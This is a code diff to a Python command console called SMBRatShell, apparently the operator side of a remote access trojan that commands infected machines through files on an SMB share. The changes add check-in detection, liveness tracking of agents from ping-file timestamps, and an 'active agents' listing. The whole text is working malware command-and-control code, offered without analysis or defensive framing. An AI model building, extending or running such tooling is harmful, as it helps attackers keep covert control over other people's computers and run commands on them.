@@ -2,6 +2,7 @@ import argparse
 import cmd
 import os
 import pprint
+import time
 
 from watchdog.events import FileSystemEventHandler, DirCreatedEvent
 from watchdog.observers import Observer
@@ -10,6 +11,9 @@ from colorama import Fore, Back, Style
 
 EXEC_DAT = 'exec.dat'
 OUTPUT_DAT = 'output.dat'
+PING_DAT = 'ping.dat'
+INFO_DAT = 'info.dat'
+CHECKIN_DAT = 'checkin.dat'
 Share = None
 
 Sessions = dict(default = dict())
@@ -23,6 +27,8 @@ class CLIArgumentParser( argparse.ArgumentParser ) :
 
 	# def error(self, message) : print (message)
 
+def get_path(project, agent, file = INFO_DAT):
+	return Share + os.sep + project + os.sep + agent + os.sep + file
 
 def get_exec_path(project, agent):
 	return Share + os.sep + project + os.sep + agent + os.sep + EXEC_DAT
@@ -51,7 +57,7 @@ def initialize(share_folder) :
 
 	#Changed os.listdir to os.walk which returns [path/of/dir, [tupple, of, directories], [tuple, of, files]]
 	for project in os.listdir(share_folder):
-		print (project)
+		# print (project)
 		if os.path.isfile(project):
 			continue
 		Sessions[project] = {}
@@ -61,18 +67,37 @@ def initialize(share_folder) :
 				continue
 			agent_dir = project_dir + os.sep + agent + os.sep
 			Sessions[project][agent] = {}
-			Sessions[project][agent]['exec'] = os.path.isfile(agent_dir + EXEC_DAT)
-			Sessions[project][agent]['output'] = os.path.isfile(agent_dir + OUTPUT_DAT)
+			# Sessions[project][agent]['exec'] = os.path.isfile(agent_dir + EXEC_DAT)
+			# Sessions[project][agent]['output'] = os.path.isfile(agent_dir + OUTPUT_DAT)
+
+
+def check_active(project, agents = None, timeout = 20):
+	ret = {}
+	if agents == None:
+		agents = Sessions[project].keys()
+	for agent in agents:
+		agent_ping_path = get_path(project, agent, PING_DAT)
+		now = int(time.time())
+		# Get the Modified Time of "ping.dat" of the Agent
+		mtime = os.stat(agent_ping_path)[-2]
+		pinged_before = int(now) - mtime
+		alive = timeout - pinged_before > 0
+		ret[agent] = {
+			'alive' : alive,
+			'last' : pinged_before
+			}
+	return ret
 
 
 class SessionHandler(FileSystemEventHandler) :
 
 	def on_created(self, event):
 		# print(event)
-		if type(event) == DirCreatedEvent :
-			# if path of type <Share>/<ProjectName>/<Agent-MAC>
+		# if type(event) == DirCreatedEvent :
+		if event.src_path.endswith(CHECKIN_DAT):
+			# if path of type .../<Share>/<ProjectName>/<Agent-MAC>/checkin.dat
 			if event.src_path.count(os.sep) == 2 :
-				project, agent = event.src_path.split(os.sep)[1:]
+				project, agent = event.src_path.split(os.sep)[-3:-1]
 				# MAC characters: len('XX:XX:XX:XX:XX:XX') = 17
 				agent_hostname, agent_mac = agent[:-18], agent[-17:]
 				# print (project, agent_hostname, agent_mac)
@@ -84,8 +109,6 @@ class SessionHandler(FileSystemEventHandler) :
 		# print (Sessions)
 
 
-
-
 	def on_deleted(self, event):
 		if event.src_path.endswith(EXEC_DAT):
 			# event.src_path: <Share>/<ProjectName>/<Agent-MAC>/<file_deleted>
@@ -93,7 +116,6 @@ class SessionHandler(FileSystemEventHandler) :
 			project, agent = event.src_path.split(os.sep)[-3:-1]
 			output_dat = get_output_path(project, agent)
 			with open(output_dat, 'r') as output_file:
-
 				print ('''
 [<] Response from '{project}/{hostname}': 
 
@@ -114,11 +136,12 @@ class SMBRatShell(cmd.Cmd) :
 	# def do_EOF(self, *args): return ''
 	def emptyline(self, *args): return ''
 
-	def do_session(self, line):
+	def do__session(self, line):
 		pprint.pprint(self.session_dict)
 		pass
 
 	# Change selected command to agents command
+	def do_selected(self, line): pass
 	def do_agents(self, line):
 		"""
 > agents
@@ -141,6 +164,17 @@ Shows the list of Selected Agents
 					print ("{}/{}".format(project, agent))
 			return
 
+		if args.active:
+			for project in  self.session_dict.keys():
+				active_agents = check_active(project)
+				print ( "=== {}".format(project) )
+				for agent, act_tuple in active_agents.items():
+					print ("[{alive}] {agent} ({last} secs ago)".format(
+						alive = "X" if act_tuple['alive'] else " ",
+						agent = agent,
+						last = int(act_tuple['last'])
+						)
+					)
 
 		if args.add:
 			for add_arg in args.add:
@@ -174,9 +208,6 @@ Shows the list of Selected Agents
 				except:
 					print ("Agent '{}/{}' not found".format(project, agent))
 					continue
-
-		if args.active:
-			print("not yet implemented")
 
 		if args.selected:
 			if not self.selected:
@@ -240,6 +271,7 @@ if __name__ == '__main__' :
 	parser = argparse.ArgumentParser()
 
 	parser.add_argument('SHARE_PATH', help = 'Path to the directory that is used with the SMB Share')
+	# parser.add_argument('--smb-auto-start', '-s', help = '''Uses impacket's "smbserver.py" to start an SMB Server with specified "ShareName"''',\
 	parser.add_argument('--smb-auto-start', '-s', help = '''Uses impacket's "smbserver.py" to start an SMB Server with specified "ShareName"''',\
 						default = False, action = 'store_true')
 
